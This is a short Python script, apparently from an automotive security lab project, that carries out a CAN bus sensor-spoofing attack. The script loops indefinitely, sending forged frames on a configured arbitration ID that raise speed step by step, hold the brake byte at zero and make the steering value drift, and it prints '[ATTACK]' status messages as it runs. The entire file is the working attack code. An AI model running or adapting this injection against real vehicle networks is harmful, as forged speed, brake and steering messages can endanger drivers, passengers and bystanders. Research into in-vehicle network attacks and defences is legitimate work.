import can
import time
from config.can_config import CAN_INTERFACE, CAN_CHANNEL, CAN_ID

bus = can.interface.Bus(
    channel=CAN_CHANNEL,
    interface=CAN_INTERFACE
)

print("[ATTACK] Sensor spoofing attack started")

speed = 30
steering = 0

try:
    while True:
        speed += 10          # gradual increase
        steering += 5        # gradual drift

        msg = can.Message(
            arbitration_id=CAN_ID,
            data=[
                min(speed, 255),
                0,                       # brake OFF
                steering % 90            # steering wrap
            ],
            is_extended_id=False
        )

        bus.send(msg)
        time.sleep(0.3)

except KeyboardInterrupt:
    print("\n[ATTACK] Sensor spoofing attack stopped")

finally:
    bus.shutdown()
    print("[ATTACK] CAN bus closed cleanly")
